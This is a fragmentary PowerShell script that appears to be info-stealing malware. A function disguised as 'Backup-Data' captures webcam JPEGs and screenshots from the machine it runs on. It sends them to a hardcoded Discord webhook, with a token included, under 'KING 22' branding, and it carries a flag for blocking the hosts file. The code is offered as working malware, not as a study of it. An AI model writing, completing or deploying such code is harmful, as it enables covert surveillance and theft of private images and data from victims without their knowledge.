$webhook = "https://discord.com/api/webhooks/1403247434632527893/9ibfo28opKkw0IYORSg0otqwJ3KpBWtx2L8a7KJH6UWTOazI5oMJoR4oH6O9C6HPkoDp" 
$debug = $false
$blockhostsfile = $true
...
function Backup-Data {
    ...
    $embed_and_body = @{
        ...
        "url"        = "https://discord.com/invite/uuPmBt9H"
        "embeds"     = @(
            @{
                "title"       = "KING 22"
    ...
    foreach ($jpegfile in $jpegfiles) {
        $name = $jpegfile.Name
        $messageContent = @{content = "## :camera: Webcam" ; username = "22CAM" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
    ...
    # Send screenshot
    $messageContent = @{content = "## :eyes: 22SCREENSHOT"; username = "22SH" ; avatar_url = $avatar } | ConvertTo-Json
